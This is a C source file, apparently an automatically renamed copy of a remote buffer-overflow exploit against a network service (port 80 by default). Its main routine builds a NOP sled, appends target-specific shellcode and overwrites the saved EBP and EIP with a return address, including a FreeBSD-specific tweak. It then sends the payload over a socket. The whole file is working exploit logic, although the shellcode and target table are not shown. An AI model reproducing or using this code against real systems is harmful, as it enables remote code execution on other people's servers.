#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {scalar_t__ retaddress; int bufsize; int junk; char* shellcode; long offset; } ;

/* Variables and functions */
 int /*<<< orphan*/  NOP ; 
 int FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (int,char**,char*) ; 
 scalar_t__ FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (char*,int /*<<< orphan*/ ,int) ; 
 int FUNC6 (int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 char* static_crap ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*) ; 
 int FUNC11 (char*) ; 
 TYPE_1__* targets ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (int,char*,int) ; 

int FUNC14(int argc, char **argv){

  char *buffer,*tmp;
  long retaddress;
  char rcv[200];
  int fd,i,arg,debug=0,type=0,port=80,offset=250;

  if(argc < 2) { FUNC12(argv[0]); }

  while ((arg = FUNC2 (argc, argv, "dh:o:l:p:t:")) != -1){
    switch (arg){
    case 'd':
	debug = 1;
	break;
    case 'o':
      offset = FUNC0(optarg);
      break;
    case 'p':
      port = FUNC0(optarg);
      break;
    case 't':
      type = FUNC0(optarg);
      break;
    default :
      FUNC12(argv[0]);
    }
  }

  if((targets[type].retaddress) != 0) {
    buffer = (char *)FUNC3((targets[type].bufsize));

    /* some junk may be required to counter buffer manipulation */

    if(targets[type].junk == 1) {

    tmp = (char *)FUNC3(FUNC11(static_crap) + FUNC11(targets[type].shellcode));

    FUNC10(tmp,targets[type].shellcode);
    FUNC9(tmp,static_crap);

    targets[type].shellcode = tmp;

    }

    FUNC5(buffer,NOP,targets[type].bufsize);
    FUNC4(buffer + (targets[type].bufsize) - (FUNC11(targets[type].shellcode) + 8) ,targets[type].
shellcode,FUNC11(targets[type].shellcode));

    /* Overwrite EBP and EIP */
    *(long *)&buffer[(targets[type].bufsize) - 8]  = (targets[type].retaddress - targets[type].offset);


    // If freebsd we need to place a value without 00 in ebp

    if(type == 4) {
       *(long *)&buffer[(targets[type].bufsize) - 8]  = 0xbfbff654;
    }

    *(long *)&buffer[(targets[type].bufsize) - 4]  = (targets[type].retaddress - targets[type].offset);

    /* Uncomment to overwrite eip and ebp with 41414141 */
    if(debug == 1) {
    *(long *)&buffer[(targets[type].bufsize) - 8]  = 0x41414141;
    *(long *)&buffer[(targets[type].bufsize) - 4]  = 0x41414141;
    }
  }

  fd = FUNC6(port);

  FUNC13(fd,buffer,FUNC11(buffer));
  FUNC13(fd,"\n",1);
  FUNC13(fd,"\n",1);

  FUNC8(1);
  FUNC7(fd);

  FUNC1(fd);
  return 0;

}